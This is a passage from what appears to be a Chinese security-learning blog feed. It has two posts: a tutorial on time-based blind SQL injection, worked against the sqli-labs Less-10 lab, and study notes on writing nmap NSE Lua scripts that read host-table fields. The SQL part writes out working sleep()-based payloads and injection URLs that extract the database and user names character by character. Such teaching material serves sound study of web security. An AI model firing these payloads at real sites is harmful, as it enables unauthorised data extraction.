    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="sql注入漏洞时间盲注原理"><a href="#sql注入漏洞时间盲注原理" class="headerlink" title="sql注入漏洞时间盲注原理"></a>sql注入漏洞时间盲注原理</h2><p>根据时间来判断漏洞<br>代码<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814112506540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
<p>不管你输入什么都不显示<br>这个就很难检查出来sql注入漏洞<br>我们就可以根据网站的延迟时间来判断是否查询sql注入漏洞和数据</p>
<h2 id="sql注入漏洞时间盲注方法"><a href="#sql注入漏洞时间盲注方法" class="headerlink" title="sql注入漏洞时间盲注方法"></a>sql注入漏洞时间盲注方法</h2><p><strong>现在的数据库名是dvwa</strong><br>抛开的来说</p>
<ol>
<li><p>sleep()函数<br>他这个函数是延迟程序执行的<br>代码</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">sleep</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>
<p>dai代码的意思是延迟100秒赞在执行<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020081411525959.png#pic_center" alt="在这里插入图片描述"></p>
</li>
<li><p>核心语法：就可以判断数据库名了</p>
</li>
</ol>
<p><strong>当前数据库名是dvwa</strong></p>
<p>代码</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="keyword">left</span>(<span class="keyword">database</span>(),<span class="number">1</span>)=<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>,<span class="keyword">sleep</span>(<span class="number">3</span>));</span><br></pre></td></tr></table></figure>
<p>left()函数这个有说<a href="https://blog.csdn.net/qq_41860876/article/details/107815405">4. 网易web安全渗透， sql 布尔型盲注</a><br>上面代码介绍<br>意思判断是<code>database()</code>查询当前数据库名第1个字符比较正确直接返回<code>0</code>    错误就执行<code>sleep(3)</code>延迟3秒返回<code>0</code><br>结果是d</p>
<p>这个我输入<code>a</code>他延迟3秒说明不是<code>a</code><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814115450200.png#pic_center" alt="在这里插入图片描述"></p>
<p>我输入<code>d</code>他立刻就执行了说明就是<code>d</code>字符<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814120137363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
<ol start="3">
<li>真实场景：就可以判断数据库名了<br>在真实场景网站可能要waf和其他机智就不让输入<code>&#39;</code><br>就可以上一节学习到的<code>substr()</code>函数和<code>ascii()</code>函数在这个查看<a href="https://blog.csdn.net/qq_41860876/article/details/107815405">4. 网易web安全渗透， sql 布尔型盲注</a></li>
</ol>
<p>列<br>数据库名是dvwa<br>代码</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">100</span>,<span class="number">0</span>,<span class="keyword">sleep</span>(<span class="number">3</span>));</span><br></pre></td></tr></table></figure>
<p>代码介绍<br>的意思是查询当前数据库名称取第一个到第一个字符串，<br>然后<code>ascii()</code>函数叫字符串转化成<code>ascii</code>码，然后进行比较正确就直接返回0，错误就执行sleep(3)延迟3秒返回0<br>结果是<code>100=d</code>    </p>
<p>输入<code>97</code><br><code>97=a</code><br>延迟3秒，说明数据库名的第一个字符不是<code>a</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814122024728.png#pic_center" alt="在这里插入图片描述"><br>输入<code>100 </code><br><code>100=d</code><br>发现立即执行了说明就是<code>d</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814122134983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="1-判断是否查询sql注入漏洞"><a href="#1-判断是否查询sql注入漏洞" class="headerlink" title="1. 判断是否查询sql注入漏洞"></a>1. 判断是否查询sql注入漏洞</h3><p>第10关<br>输入<code>http://192.168.0.102/Less-10/?id=1</code><br>返回<strong>You are in………..</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814122521235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入<code>http://192.168.0.102/Less-10/?id=1&#39;</code><br>返回<strong>You are in………..</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814122700875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入<code>http://192.168.0.102/Less-10/?id=1&#39; and &#39;1&#39; =&#39; 1  --+ </code><br>返回<strong>You are in………..</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814122815430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入<code>http://192.168.0.102/Less-10/?id=1&#39; and &#39;1&#39; =&#39; 2  --+ </code><br>还是返回返回<strong>You are in………..</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814122857588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入<code>192.168.0.102/Less-10/?id=1&#39; )  or  (&#39;a&#39;=&#39;a  --+</code><br>还是返回还是返回返回<strong>You are in………..</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814123200314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>等等等等等等等等等等等等等等其他方法我就不演示了<br>发现根本就没有注入点</p>
<p>我们就可以使用sql时间盲注了</p>
<p>输入<code>http://192.168.0.102/Less-10/?id=1&quot; and if(left(user(),1)=&#39;a&#39;,0,sleep(3)) --+</code><br><strong>user()查询当前的用户名</strong><br>输入<code>a</code>发现延迟3秒<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814124903659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>直到输入到r发现没有延迟，说明存在sql注入漏洞</strong><br>输入<code>http://192.168.0.102/Less-10/?id=1&quot; and if(left(user(),1)=&#39;r&#39;,0,sleep(3)) --+</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814125146137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="数据读取"><a href="#数据读取" class="headerlink" title="数据读取"></a>数据读取</h3><p>读取当前数据库<br>URL地址<code>http://192.168.0.102/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))=100,0,sleep(3)) --+</code><br>输入<code>100=d</code><br>发现<code>3</code>秒才返回<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814130304432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入<code>115=s</code><br>发现直接就响应了说明就是<code>s</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814130441125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>这个太麻烦而且还慢可以自己<br>写一个sql时间盲注脚本应为我时间不多，有时间在写</p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>5，nmap，2.Lua语言，nmap NSE中的API，host table(表)</title>
    <url>/2020/08/30/5%EF%BC%8Cnmap%EF%BC%8C2.Lua%E8%AF%AD%E8%A8%80%EF%BC%8Cnmap%20NSE%E4%B8%AD%E7%9A%84API%EF%BC%8Chost%20table(%E8%A1%A8)/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="书名诸神之眼NMAP-学习笔记"><a href="#书名诸神之眼NMAP-学习笔记" class="headerlink" title="书名诸神之眼NMAP 学习笔记"></a>书名诸神之眼NMAP 学习笔记</h2><h2 id="Lua文件I-O操作"><a href="#Lua文件I-O操作" class="headerlink" title="Lua文件I/O操作"></a>Lua文件I/O操作</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020060908040667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
<p>打开文件，读一行和关闭文件<br>代码<br>函数<code>io.open(&quot;文件名&quot;,&quot;打开方式&quot;)</code>打开文件<br>函数<code>read()</code>读取文件第一行<br>函数close()关闭文件还可以格式<code>io.close(a)</code></p>
<p>咧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;lua</span><br><span class="line">--读的方式打开文件</span><br><span class="line">a&#x3D;io.open(&quot;a.txt&quot;,&quot;r&quot;)</span><br><span class="line"></span><br><span class="line">--输出文件第一行</span><br><span class="line">print(a:read())</span><br><span class="line"></span><br><span class="line">--关闭打开的文件</span><br><span class="line">a:close()</span><br></pre></td></tr></table></figure>
<p>a.txt文件内容<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200609083453963.png" alt="在这里插入图片描述"><br>执行结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020060908351388.png" alt="在这里插入图片描述"></p>
<h2 id="Lua协同程序"><a href="#Lua协同程序" class="headerlink" title="Lua协同程序"></a>Lua协同程序</h2><ol>
<li>协同程序和线程类似拥有独立的堆栈、独立的局部变量、独立的指令指针，同时又与其他协同程序共享全局变量和其他大部分东西</li>
<li>线程与协同程序的主要区别在于，一个具有多个线程的程序可以同时运行几个线程，而协同程序却需要彼此协作运行。在任一指定时刻只有一个协同程序在运行，并且这个正在运行的协同程序只有在明确要求挂起的时候才会被挂起。协同程序有点类似同步的多线程，在等待同一个线程锁的几个线程有点类似协同。</li>
</ol>
<h3 id="Lua协同程序语法"><a href="#Lua协同程序语法" class="headerlink" title="Lua协同程序语法"></a>Lua协同程序语法</h3><ol>
<li>coroutine.create()<br>这个方法用来创建一个coroutine，将要进行多线程的函数作为参数，返回值是一个coroutine。</li>
<li>coroutine.resume()<br>这个方法用来完成coroutine重启操作，与create配合使用。</li>
<li>coroutine.yield()<br>这个方法用来实现coroutine的挂起操作，将coroutine设置为挂起状态。</li>
<li>coroutine.status()<br>这个方法用来查看coroutine的状态。这里coroutine的状态一共有dead、suspend、running三种。</li>
<li>coroutine.wrap()<br>这个方法创建一个coroutine，用于返回一个函数，一旦调用这个函数，就进入协同程序，与create功能相同。</li>
<li>coroutine.running()这个方法返回正在运行的coroutine。一个coroutine就是一个线程，当使用running时，返回的是当前正在运行的协同程序的线程号。</li>
</ol>
<h2 id="nmap-NSE中的API"><a href="#nmap-NSE中的API" class="headerlink" title="nmap NSE中的API"></a>nmap NSE中的API</h2><p>Nmap中的引擎会向脚本传递两个类型的参数<strong>host</strong>和<strong>port</strong><br>host 的table(表)存放这目标主机信息<br>port 的table(表)存放这目标端口信息<br>他和port和host详细程度取决，扫描过程中选项选项的设定，例如，如果在扫描时没有指定要对主机的操作系统进行扫描的话，那么host.os的内容就是空的</p>
<h2 id="1host-table"><a href="#1host-table" class="headerlink" title="1host table"></a>1host table</h2><ol>
<li>host.os字段<br>里面存放这目标主机的类型<br>这个字段中包括了一个我们常见的操作系统信息的数组，涉及操作系统的供应商、所属系列、具体型号、设备类型、CPE等。如果某个字段没有被定义的话，这个字段可以为nil</li>
</ol>
<p>咧<br>代码<br>我保存到了名为<code>wode.nse</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line"></span><br><span class="line">description &#x3D; [[]]</span><br><span class="line"></span><br><span class="line">author &#x3D; &quot;kali&quot;</span><br><span class="line">license &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;</span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule &#x3D; function( host, port )</span><br><span class="line">	return true</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	 return host.os</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p><strong>上面的代码的意思是return true(真)执行return host.os返回host.os</strong><br>叫<code>wode.nse</code>移动到<code>/usr/share/nmap/scripts/</code>文件下面<br>复制进去要更新一下nmap脚本的数据库<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script-updatedb</span><br></pre></td></tr></table></figure>
<p>结果<br>用上面的脚本</p>
<p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap --script wode 192.168.43.244 -O -p 3389</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/202006091024414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"><br>2. host.ip字段<br>里面包含了的IP地址<br>咧<br>代码<br>我保存到了名为<code>wode.nse</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line"></span><br><span class="line">description &#x3D; [[]]</span><br><span class="line"></span><br><span class="line">author &#x3D; &quot;root&quot;</span><br><span class="line"></span><br><span class="line">license &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;</span><br><span class="line"></span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule &#x3D; function(host, port)</span><br><span class="line">	return true</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line"></span><br><span class="line">	return host.ip</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>叫<code>wode.nse</code>移动到<code>/usr/share/nmap/scripts/</code>文件下面<br>复制进去要更新一下nmap脚本的数据库<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script-updatedb</span><br></pre></td></tr></table></figure>
<p>结果<br>用上面的脚本命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap --script wode www.baidu.com -p 80</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020061007414782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3. host.name字段<br>里面包含了目标的反向DNS域名<br>咧<br>代码<br>我保存到了名为<code>wode.nse</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line"></span><br><span class="line">description &#x3D; [[]]</span><br><span class="line"></span><br><span class="line">author &#x3D; &quot;root&quot;</span><br><span class="line"></span><br><span class="line">license &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;</span><br><span class="line"></span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule &#x3D; function(host, port)</span><br><span class="line">	return true</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line"></span><br><span class="line">	return host.name</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>叫<code>wode.nse</code>移动到<code>/usr/share/nmap/scripts/</code>文件下面<br>复制进去要更新一下nmap脚本的数据库<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script-updatedb</span><br></pre></td></tr></table></figure>
<p>结果<br>不知道怎么回事好像不能检查到<br>4. host.targetname字段<br>里面包含了主机的在命令中的命令<br>5. host.directly_connected字段‘</p>
<p>字段是一个布尔值true和false，表示目标计算机是否与我们同在一个子网<br>咧<br>代码<br>我保存到了名为<code>wode.nse</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line"></span><br><span class="line">description &#x3D; [[]]</span><br><span class="line"></span><br><span class="line">author &#x3D; &quot;root&quot;</span><br><span class="line"></span><br><span class="line">license &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;</span><br><span class="line"></span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule &#x3D; function(host, port)</span><br><span class="line">	return true</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line"></span><br><span class="line">	return host.directly_connected</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>叫<code>wode.nse</code>移动到<code>/usr/share/nmap/scripts/</code>文件下面<br>复制进去要更新一下nmap脚本的数据库<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script-updatedb</span><br></pre></td></tr></table></figure>
<p>结果1是true,这个我扫描的是我内网<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap --script wode 192.168.43.221 -p 80</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200610084715462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>结果2是false我扫描的是百度，不是在我内网的<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap --script wode www.baidu.com -p 80</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200610085123555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6. host.mac_addr字段<br>这个字段是目标的MAC地址，注意：要是扫描的不是同一个网段的话可能就没有效果，应为扫描外网是通用IP寻址的<br>咧<br>代码<br>我保存到了名为<code>wode.nse</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line"></span><br><span class="line">description &#x3D; [[]]</span><br><span class="line"></span><br><span class="line">author &#x3D; &quot;root&quot;</span><br><span class="line"></span><br><span class="line">license &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;</span><br><span class="line"></span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule &#x3D; function(host, port)</span><br><span class="line">	return true</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line"></span><br><span class="line">	return host.mac_addr</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>叫<code>wode.nse</code>移动到<code>/usr/share/nmap/scripts/</code>文件下面<br>复制进去要更新一下nmap脚本的数据库<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script-updatedb</span><br></pre></td></tr></table></figure>
<p>结果<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap --script wode 192.168.43.221 -p 80</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200610094109507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">    </p>
<ol start="7">
<li>host.mac_addr_src</li>
</ol>
<p>段中是使用的计算机的MAC地址<br>咧<br>代码<br>我保存到了名为<code>wode.nse</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line"></span><br><span class="line">description &#x3D; [[]]</span><br><span class="line"></span><br><span class="line">author &#x3D; &quot;root&quot;</span><br><span class="line"></span><br><span class="line">license &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;</span><br><span class="line"></span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule &#x3D; function(host, port)</span><br><span class="line">	return true</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line"></span><br><span class="line">	return host.mac_addr_src</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>叫<code>wode.nse</code>移动到<code>/usr/share/nmap/scripts/</code>文件下面<br>复制进去要更新一下nmap脚本的数据库<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script-updatedb</span><br></pre></td></tr></table></figure>
<p>结果<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap --script wode 192.168.43.1</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200610094657504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>8. host.interface_mtu<br>字段中是网络中的MTU值<br>咧<br>代码<br>我保存到了名为<code>wode.nse</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line"></span><br><span class="line">description &#x3D; [[]]</span><br><span class="line"></span><br><span class="line">author &#x3D; &quot;root&quot;</span><br><span class="line"></span><br><span class="line">license &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;</span><br><span class="line"></span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule &#x3D; function(host, port)</span><br><span class="line">	return true</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line"></span><br><span class="line">	return host.interface_mtu</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>叫<code>wode.nse</code>移动到<code>/usr/share/nmap/scripts/</code>文件下面<br>复制进去要更新一下nmap脚本的数据库<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script-updatedb</span><br></pre></td></tr></table></figure>
<p>结果<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap --script wode 192.168.43.1</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200610095011857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>9. host.bin_ip字段<br> 字段中的内容是使用4字节字符串表示的IPv4目标地址以及使用16字节字符串来表示IPv6目标地址<br> 咧<br> 代码<br> 我保存到了名为<code>wode.nse</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line"></span><br><span class="line">description &#x3D; [[]]</span><br><span class="line"></span><br><span class="line">author &#x3D; &quot;root&quot;</span><br><span class="line"></span><br><span class="line">license &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;</span><br><span class="line"></span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule &#x3D; function(host, port)</span><br><span class="line">	return true</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line"></span><br><span class="line">	return host.bin_ip</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>叫<code>wode.nse</code>移动到<code>/usr/share/nmap/scripts/</code>文件下面<br>复制进去要更新一下nmap脚本的数据库<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script-updatedb</span><br></pre></td></tr></table></figure>
<p>结果<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap --script wode 192.168.31.22 -p 3389</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200610150149660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>10. host.bin_ip_src</p>
<p>里面字段中包含两个地址，一个是使用IPv4格式表示所使用的计算机地址，另一个是用IPv6格式表示所使用的计算机地址<br>咧<br>代码<br>我保存到了名为<code>wode.nse</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line"></span><br><span class="line">description &#x3D; [[]]</span><br><span class="line"></span><br><span class="line">author &#x3D; &quot;root&quot;</span><br><span class="line"></span><br><span class="line">license &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;</span><br><span class="line"></span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule &#x3D; function(host, port)</span><br><span class="line">	return true</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line"></span><br><span class="line">	return host.bin_ip_src</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>叫<code>wode.nse</code>移动到<code>/usr/share/nmap/scripts/</code>文件下面<br>复制进去要更新一下nmap脚本的数据库<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script-updatedb</span><br></pre></td></tr></table></figure>
